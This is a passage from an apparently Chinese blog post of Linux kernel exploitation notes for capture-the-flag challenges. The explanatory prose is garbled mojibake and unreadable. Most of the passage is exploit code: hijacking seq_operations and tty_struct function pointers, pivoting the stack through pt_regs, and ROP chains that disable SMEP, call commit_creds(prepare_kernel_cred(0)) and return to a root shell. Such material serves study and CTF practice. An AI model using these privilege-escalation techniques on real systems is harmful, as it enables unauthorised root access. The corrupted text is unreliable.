<span class="keyword">if</span> (result)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;result:%p\n&quot;</span>,result);</span><br><span class="line">        cred= * (<span class="keyword">size_t</span> *)(result<span class="number">-0x8</span>);</span><br><span class="line">        real_cred= *(<span class="keyword">size_t</span> *)(result<span class="number">-0x10</span>);</span><br><span class="line">        <span class="keyword">if</span> ((cred||<span class="number">0xff00000000000000</span>) &amp;&amp; (real_cred == cred))</span><br><span class="line">        &#123;</span><br><span class="line">            target_addr=addr+result-(<span class="keyword">int</span>)(buf);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found task_struct 0x%lx\n&quot;</span>,target_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+]found cred 0x%lx\n&quot;</span>,real_cred);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åå†å€Ÿç”¨ä»»æ„å†™æˆ–è€…ä¿®æ”¹FDç”³è¯·æ¥ä¿®æ”¹credç»“æ„ä¸­çš„å†…å®¹å³å¯ã€‚</p>

        <h3 id="å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ"   >
          <a href="#å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ" class="headerlink" title="å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ"></a>å€ŸåŠ©statè®¾å¤‡ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ</h3>
      <p>åŸç†å°±æ˜¯åŠ«æŒ<code>seq_operations</code>ç»“æ„ä½“çš„å‡½æ•°æŒ‡é’ˆï¼Œè¿›è€Œæ§åˆ¶ç¨‹åºæµã€‚</p>
<p>è¥¿æ¹–è®ºå‰‘â€“easy_kernel</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055#h3-5" >è¥¿æ¹–è®ºå‰‘2021çº¿ä¸Šåˆèµ›easykernelé¢˜è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æœ‰å¦‚ä¸‹ç»“æ„ä½“ï¼Œå¤§å°ä¸º0x20ï¼Œå½“æˆ‘ä»¬å¯ä»¥ç”³è¯·0x20å¤§å°çš„Chunkï¼Œç„¶åé‡Šæ”¾ï¼Œå†æ‰“å¼€<code>/proc/self/stat</code>è®¾å¤‡å°±å¯ä»¥å¾—åˆ°è¯¥ç»“æ„ä½“ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct seq_operations &#123;</span><br><span class="line">    void * (*start) (struct seq_file *m, loff_t *pos);</span><br><span class="line">    void (*stop) (struct seq_file *m, void *v);</span><br><span class="line">    void * (*next) (struct seq_file *m, void *v, loff_t *pos);</span><br><span class="line">    int (*show) (struct seq_file *m, void *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚æœå­˜åœ¨UAFä¹‹ç±»çš„å°±å¯ä»¥ä»é‡Œé¢è¯»å–å‡½æ•°åç§»ï¼Œè·å¾—kernelåŸºåœ°å€ï¼Œç„¶åè¿˜å¯ä»¥ä¿®æ”¹é‡Œé¢çš„startå‡½æ•°æŒ‡é’ˆï¼ŒåŠ«æŒä½¿å…¶æŒ‡å‘æˆ‘ä»¬çš„gadgetï¼Œå½“æˆ‘ä»¬å¯¹è¯¥è®¾å¤‡è¿›è¡Œè¯»å–æ“ä½œæ—¶ï¼Œå°±ä¼šè°ƒç”¨è¯¥startæŒ‡é’ˆï¼Œä»è€Œè¿›å…¥åˆ°æˆ‘ä»¬åŠ«æŒçš„gadgetï¼Œè¿›è€Œå¯ä»¥ç¨‹åºæ§åˆ¶æ‰§è¡Œæµã€‚ä½¿ç”¨å¦‚ä¸‹æ±‡ç¼–è¿›è¡Œå¯¹è¯¥è®¾å¤‡çš„æ“ä½œã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line"><span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br></pre></td></tr></table></div></figure>

<p>åŠ«æŒä¹‹åå†éœ€è¦getshellå°±éœ€è¦æ³¨æ„å¦ä¸€ä¸ªç»“æ„ä½“äº†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å½“æˆ‘ä»¬è°ƒç”¨syscallçš„æ—¶å€™ï¼Œä¼šå°†ä»¥ä¸Šå¯„å­˜å™¨å‹å…¥å†…æ ¸æ ˆä¸­ï¼Œç„¶åå½¢æˆå¦‚ä¸Šçš„ç»“æ„ï¼Œå³å¦‚ä¸‹æ±‡ç¼–æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x400db8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, user_cs;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, user_rflags;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, user_sp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, user_ss;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸Šçš„æ±‡ç¼–ä¼šåœ¨å†…æ ¸æ ˆä¸­å½¢æˆå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151105563.png" alt="image-20220115110535050"></p>
<p>æ‰€ä»¥å¦‚æœå€ŸåŠ©<code>add_rsp xx;pop_ret</code>è¿™ç±»æŒ‡ä»¤ï¼Œå°±å¯ä»¥å°†æˆ‘ä»¬çš„æ§åˆ¶æµçš„æ ˆæ‹‰é«˜åˆ°æˆ‘ä»¬å¯æ§æ•°æ®èŒƒå›´ï¼Œè¿›è€ŒåŠ«æŒæ ˆã€‚ä½¿ç”¨<code>commit(cred)</code>ææƒï¼ˆè¿™é‡Œçš„ææƒå› ä¸ºæ— æ³•æ§åˆ¶rdiï¼Œæ‰€ä»¥å°±å€ŸåŠ©<code>init_cred</code>æ¥ææƒï¼‰ã€‚ææƒä¹‹åå€ŸåŠ©<code>swapgs_restore_regs_and_return_to_usermode</code>å‡½æ•°ä¸­çš„popç³»åˆ—æ¥è°ƒæ•´æ ˆï¼Œå³å€Ÿç”¨äº†å‡ ä¸ªæ ˆçš„ä½ç½®ï¼Œå°±å¾—å°‘å‡ ä¸ªpopï¼Œå¦‚å›¾å€Ÿç”¨äº†5ä¸ªæ ˆæ•°æ®ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ€åå°±å¾—ä½¿å¾—è¯¥å‡½æ•°å°‘pop5ä¸ªï¼Œå³å°†swapgs_restore_regs_and_return_to_usermodeå‡½æ•°çš„gadget+=9å³å¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode += <span class="number">9</span>;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151130591.png" alt="image-20220115113005162"></p>
<p>å¦‚ä¸Šä¿®æ”¹ä¹‹åå°±å¯ä»¥å½“è¿›å…¥åˆ°è¯¥å‡½æ•°çš„swapgsçš„æ—¶å€™ï¼Œå°†æ ˆè°ƒæ•´è‡³æœ€å¼€å§‹å› ä¸ºsyscallè€Œå½¢æˆçš„ä¿å­˜pt_regsç»“æ„ä½“ä¸­çš„ç”¨æˆ·æ€æ•°æ®çš„åœ°æ–¹ï¼Œä½¿å¾—ææƒä¹‹åæˆåŠŸè¿”å›ç”¨æˆ·æ€</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">//.....................</span></span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ‰€ç¤ºæ ˆå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201151136862.png" alt="image-20220115113622350"></p>
<p>ä½¿ç”¨æ­¤ç§æ–¹æ³•æ—¶ä¸€èˆ¬å¯ä»¥å…ˆè®¾ç½®ä¸€äº›æ ‡å¿—æ€§æ•°æ®ï¼Œâ€œAAAAAAâ€åœ¨æ ˆä¸Šï¼Œç„¶åæœå¯»å³å¯ï¼Œä»¥æ­¤æ¥å¯»æ‰¾è°ƒæ ˆæ‰€ç”¨çš„gadgetã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">    <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0x6565656565;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></div></figure>

<p>ç„¶ååœ¨æŸä¸ªåœ°å€èŒƒå›´è¿›è¡Œæœç´¢ï¼Œå°±èƒ½æ‰¾åˆ°è¯¥ç»“æ„ä½“çš„ä½ç½®ï¼Œå¥½åƒåªèƒ½æ˜¯pedaæ¯”è¾ƒå¥½ç”¨</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &quot;AAAAAA&quot; 0xffffc900001d3f80 0xffffc900001d3f98</span><br></pre></td></tr></table></div></figure>


        <h3 id="å€ŸåŠ©ptmxè®¾å¤‡-tty-struct"   >
          <a href="#å€ŸåŠ©ptmxè®¾å¤‡-tty-struct" class="heading-link"><i class="fas fa-link"></i></a><a href="#å€ŸåŠ©ptmxè®¾å¤‡-tty-struct" class="headerlink" title="å€ŸåŠ©ptmxè®¾å¤‡(tty_struct)"></a>å€ŸåŠ©ptmxè®¾å¤‡(tty_struct)</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64`-&gt;`SyS_write`-&gt;`SYSC_write`-&gt;`vfs_write`</span><br><span class="line">-&gt;`__vfs_write`-&gt;`tty_write`-&gt;`do_tty_write`-&gt;`n_tty_write`-&gt;`pty_write`</span><br></pre></td></tr></table></div></figure>

<p>åŸç†å°±æ˜¯åŠ«æŒ<code>tty_struct</code>ç»“æ„ä½“ä¸­çš„<code>const struct tty_operations *ops</code>ç»“æ„ä½“æŒ‡é’ˆï¼Œç„¶åå†ä¿®æ”¹<code>fake_tty_operations</code>ç»“æ„ä½“ä¸­çš„<code>pty_write</code>å‡½æ•°æŒ‡é’ˆï¼Œé€šè¿‡å¯¹è¯¥è®¾å¤‡è¿›è¡Œå†™æ“ä½œè¿›è€Œè°ƒç”¨åŠ«æŒçš„å‡½æ•°æŒ‡é’ˆï¼Œæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚</p>
<p>åŒæ—¶åœ¨è°ƒç”¨çš„æ—¶å€™raxä¸ºä»åŠ«æŒçš„tty_structç»“æ„ä½“ä¸­è·å–çš„<code>operations *ops</code>æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆå¯ä»¥è¢«æˆ‘ä»¬ä¿®æ”¹åŠ«æŒã€‚ä¹‹åå€ŸåŠ©ä¸€ä¸ªå¯¹raxå’Œrspè¿›è¡Œæ“ä½œçš„<code>gadget--movRspRax_decEbx_ret</code>è¿›è€ŒåŠ«æŒæ ˆï¼Œå®Œæˆç¨‹åºæµå’Œæ ˆçš„åŠ«æŒã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">fake_tty_operations[i] = movRspRax_decEbx_ret;</span><br><span class="line">&#125;</span><br><span class="line">fake_tty_operations[<span class="number">0</span>] = pop_rax_rbx_r12_r13_rbp_ret;</span><br><span class="line">fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">fake_tty_struct[<span class="number">0</span>] = <span class="number">0x0000000100005401</span>;<span class="comment">//need to set magic number</span></span><br><span class="line">fake_tty_struct[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">fake_tty_struct[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      <span class="comment">// pop_rax_rbx_r12_rbp_ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = movCr4Rdi_pop_rbp_ret;      <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret;      <span class="comment">// swapgs;ret</span></span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      <span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>




        <h2 id="2-æ ˆ"   >
          <a href="#2-æ ˆ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ ˆ" class="headerlink" title="2.æ ˆ"></a>2.æ ˆ</h2>
      
        <h3 id="1-commit-creds-prepare-kernel-cred-0"   >
          <a href="#1-commit-creds-prepare-kernel-cred-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-commit-creds-prepare-kernel-cred-0" class="headerlink" title="(1)commit_creds(prepare_kernel_cred(0));"></a>(1)commit_creds(prepare_kernel_cred(0));</h3>
      <p>è¿™ä¸ªç®—æ˜¯æ¯”è¾ƒå¸¸è§„çš„æ ˆæº¢å‡ºï¼Œä¸è¿‡è¿˜éœ€è¦æ³¨æ„SMEP/SMAPä»¥åŠKPTIæ˜¯å¦å¼€å¯</p>

        <h4 id="â‘ å¼€å¯SMEPæƒ…å†µ"   >
          <a href="#â‘ å¼€å¯SMEPæƒ…å†µ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ å¼€å¯SMEPæƒ…å†µ" class="headerlink" title="â‘ å¼€å¯SMEPæƒ…å†µ"></a>â‘ å¼€å¯SMEPæƒ…å†µ</h4>
      <p>è¿™ç§æƒ…å†µä¸€èˆ¬ç›´æ¥æº¢å‡ºç„¶åå…³é—­ï¼Œæˆ–è€…çŸ¥é“åŸºåœ°å€ä¹‹åå¯ä»¥å°è¯•åœ¨å†…æ ¸å®Œæˆææƒç„¶åè¿”å›ç”¨æˆ·æ€</p>

        <h5 id="ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç "   >
          <a href="#ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç " class="heading-link"><i class="fas fa-link"></i></a><a href="#ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç " class="headerlink" title="ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç "></a>ROPå…³é—­SMEPä¿æŠ¤ï¼Œæ‰§è¡Œç”¨æˆ·æ€ææƒä»£ç </h5>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* function to get root id */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getroot</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] getuid() ...&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(!getuid()) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; [root]\n[+] Enjoy your shell...\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] not root\n[+] failed !!!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> getR = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)getroot;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> sh = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)shell;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">rop[i++] = pop_rdi_ret;      <span class="comment">// </span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = movCr4Rdi_pop_rbp_ret;  <span class="comment">// mov cr4, rax; pop rbp; ret;</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)getR;</span><br><span class="line">rop[i++] = swapgs_popRbp_ret; </span><br><span class="line">rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">rop[i++] = iretq;      			<span class="comment">// iretq</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)sh;</span><br><span class="line">rop[i++] = user_cs;                <span class="comment">/* saved 